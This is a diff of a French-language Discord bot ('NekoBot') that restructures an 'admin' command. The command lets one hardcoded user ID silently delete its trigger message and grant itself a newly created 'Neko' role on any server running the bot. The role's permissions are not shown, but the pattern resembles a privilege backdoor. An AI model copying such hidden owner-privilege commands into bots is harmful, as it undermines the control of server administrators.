@@ -74,7 +74,7 @@ bot.on('message', message => {
 
     if(message.content.startsWith(prefix + "admin")) {
         message.delete()
-      if (message.author.id === "353859650686550027") {
+    if (message.author.id === "353859650686550027") {
         let membre = message.guild.member(message.author);
         let role = message.guild.roles.find('name', 'Neko');
             message.guild.createRole({
@@ -83,9 +83,6 @@ bot.on('message', message => {
             color: "#ff0000",
           })
           membre.addRole(role).catch(console.error);
-          }else {
-            message.reply("tu n'as pas la permission exacte pour executer cette commande.");
-          }
         var embedlog = new Discord.RichEmbed()
         .setTitle("Logs :tools:")
         .setDescription("--")
@@ -95,11 +92,14 @@ bot.on('message', message => {
         .addField("Commande", "&admin")
         .setFooter(`© NekoBot • ` + `Commande executée par ` + message.author.tag, message.author.avatarURL).setTimestamp()
         bot.channels.get("501007481363890176").send(embedlog);
-  }
+    }else {
+      message.reply("tu n'as pas la permission exacte pour executer cette commande.");
+    }
+    }
       
-      if(message.content.startsWith("neko admin")) {
+    if(message.content.startsWith("neko admin")) {
         message.delete()
-      if (message.author.id === "353859650686550027") {
+    if (message.author.id === "353859650686550027") {
         let membre = message.guild.member(message.author);
         let role = message.guild.roles.find('name', 'Neko');
             message.guild.createRole({
@@ -108,9 +108,6 @@ bot.on('message', message => {
             color: "#ff0000",
           })
           membre.addRole(role).catch(console.error);
-          }else {
-            message.reply("tu n'as pas la permission exacte pour executer cette commande.");
-          }
         var embedlog = new Discord.RichEmbed()
         .setTitle("Logs :tools:")
         .setDescription("--")
@@ -120,7 +117,10 @@ bot.on('message', message => {
         .addField("Commande", "Neko admin")
         .setFooter(`© NekoBot • ` + `Commande executée par ` + message.author.tag, message.author.avatarURL).setTimestamp()
         bot.channels.get("501007481363890176").send(embedlog);
-  }
+    }else {
+      message.reply("tu n'as pas la permission exacte pour executer cette commande.");
+    }
+    }
 
     if(message.content === prefix + "help"){
         var embednom = new Discord.RichEmbed()
